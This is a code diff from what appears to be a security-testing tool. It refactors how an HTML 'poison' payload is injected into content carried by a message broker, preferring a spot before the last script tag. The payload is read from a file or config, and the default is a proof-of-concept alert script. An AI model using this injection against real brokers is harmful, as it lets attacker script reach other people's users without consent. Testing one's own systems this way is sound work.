@@ -79,39 +79,63 @@ def handle_html(config, content):
 
 	results = None
 
+	# --------------------------------------------------------------------------
 	# Search insertion points
-	for point in ("head", "title", "body", "script", "div", "p"):
-		insert_point = doc_root.find(".//%s" % point)
+	# --------------------------------------------------------------------------
 
-		if insert_point is None:
-			continue
+	# Try to find end of script entries
+	insert_point = doc_root.find(".//script[last()]")
 
-		# --------------------------------------------------------------------------
-		# Add the injection Payload
-		# --------------------------------------------------------------------------
-		if config.poison_payload_file is not None:
-			with open(config.poison_payload_file, "rU") as f:
-				_f_payload = f.read()
-			payload = etree.fromstring(_f_payload)
+	if insert_point is not None:
+		results = add_injection(config, doc_root, insert_point, where="before")
 
-		elif config.poison_payload:
-			payload = etree.fromstring(config.poison_payload)
-		else:
-			payload = etree.fromstring("<script>alert('You are vulnerable to broker injection')</script>")
+	else:
+		# Try to find othe entry
+		for point in ("head", "title", "body", "div", "p"):
+			insert_point = doc_root.find(".//%s" % point)
 
-		insert_point.addnext(payload)
+			if insert_point is None:
+				continue
 
-		# Set results
-		tmp_results = etree.tostring(doc_root, method="html", pretty_print=True, encoding=doc_root.docinfo.encoding)
+			results = add_injection(config, doc_root, insert_point)
 
-		# Codding filters
-		results = tmp_results.decode(errors="replace").replace("\\u000a", "\n")
-
-		break
+			break
 
 	# --------------------------------------------------------------------------
 	# Build results
 	# --------------------------------------------------------------------------
+	return results
+
+
+# ----------------------------------------------------------------------
+def add_injection(config, doc_root, insert_point, where="after"):
+	"""
+	:param where: posible values: after|before
+	:type where: str
+
+	"""
+
+	# --------------------------------------------------------------------------
+	# Add the injection Payload
+	# --------------------------------------------------------------------------
+	if config.poison_payload_file is not None:
+		with open(config.poison_payload_file, "rU") as f:
+			_f_payload = f.read()
+		payload = etree.fromstring(_f_payload)
+
+	elif config.poison_payload:
+		payload = etree.fromstring(config.poison_payload)
+	else:
+		payload = etree.fromstring("<script>alert('You are vulnerable to broker injection')</script>")
+
+	insert_point.addnext(payload)
+
+	# Set results
+	tmp_results = etree.tostring(doc_root, method="html", pretty_print=True, encoding=doc_root.docinfo.encoding)
+
+	# Codding filters
+	results = tmp_results.decode(errors="replace").replace("\\u000a", "\n")
+
 	return results
 
 
